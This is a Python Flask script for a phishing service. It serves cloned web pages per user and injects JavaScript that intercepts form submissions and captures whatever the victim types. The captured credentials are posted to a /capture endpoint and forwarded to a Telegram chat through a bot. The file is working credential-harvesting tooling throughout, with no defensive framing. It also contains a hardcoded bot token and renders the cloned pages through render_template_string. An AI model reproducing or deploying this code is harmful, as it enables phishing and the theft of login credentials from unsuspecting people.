from flask import Flask, request, render_template_string
import os
import json
from telebot import TeleBot

# 🔐 Your Telegram bot token
API_TOKEN = '8110718903:AAFlE-nSLZZPXUSmkYdEmCc69ZvIXp7iy_k'
bot = TeleBot(API_TOKEN)

app = Flask(__name__)

# 📦 Injects JS into HTML page to capture credentials
def inject_payload(html_content, user_id):
    script = f"""
    <script>
    document.addEventListener('submit', function(e) {{
        e.preventDefault();
        const formData = new FormData(e.target);
        fetch("/capture", {{
            method: "POST",
            headers: {{
                "Content-Type": "application/json"
            }},
            body: JSON.stringify({{
                user_id: "{user_id}",
                data: Object.fromEntries(formData)
            }})
        }});
    }});
    </script>
    """
    return html_content.replace('</body>', f'{script}</body>')

# 📄 Serve the cloned HTML page for a specific user
@app.route("/user/<int:user_id>")
def serve_cloned_page(user_id):
    filepath = f"clones/user_{user_id}/index.html"
    if os.path.exists(filepath):
        with open(filepath, "r", encoding="utf-8") as f:
            html = f.read()
        modified_html = inject_payload(html, user_id)
        return render_template_string(modified_html)
    return "❌ Page not found!"

# 📥 Endpoint where JS sends captured form credentials
@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json()
    user_id = data.get("user_id")
    form_data = data.get("data")

    if not user_id or not form_data:
        return "Missing data", 400

    message = "🔐 New credentials captured:\n\n"
    for key, value in form_data.items():
        message += f"{key}: {value}\n"

    try:
        bot.send_message(user_id, message)
        return "OK", 200
    except Exception as e:
        return f"Failed to send message: {str(e)}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
